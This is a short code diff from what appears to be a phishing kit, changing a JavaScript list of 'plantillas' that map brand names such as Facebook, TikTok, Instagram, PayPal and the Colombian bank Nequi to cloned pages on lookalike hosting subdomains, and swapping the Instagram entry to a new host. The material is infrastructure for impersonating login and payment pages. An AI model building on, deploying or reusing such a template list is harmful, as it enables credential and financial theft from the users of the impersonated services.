@@ -290,7 +290,7 @@ const plantillas = [
   { nombre: "Facebook Estandar", url: "https://facebook-estndar.glegogle5341-af7.workers.dev/" },
   { nombre: "TikTok", url: "https://tik-tok.glegogle5341-af7.workers.dev/" },
   { nombre: "Nequi Tarjeta", url: "https://nequi-tarjeta.glegogle5341-af7.workers.dev/" },
-  { nombre: "Instagram", url: "https://instagram.glegogle5341-af7.workers.dev/" },
+  { nombre: "Instagram", url: "https://n4bvod.mimo.run/index.html" },
   { nombre: "Facebook Escritorio", url: "https://facebook-escritorio.glegogle5341-af7.workers.dev/" },
   { nombre: "PayPal Estandar", url: "https://paypal-estandar.glegogle5341-af7.workers.dev/" },
   { nombre: "PayPal Basico", url: "https://paypal-basico.glegogle5341-af7.workers.dev/" },
@@ -1155,4 +1155,5 @@ document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatM
     actualizarUsuarios();
   }, 2000);
 })();
+
 
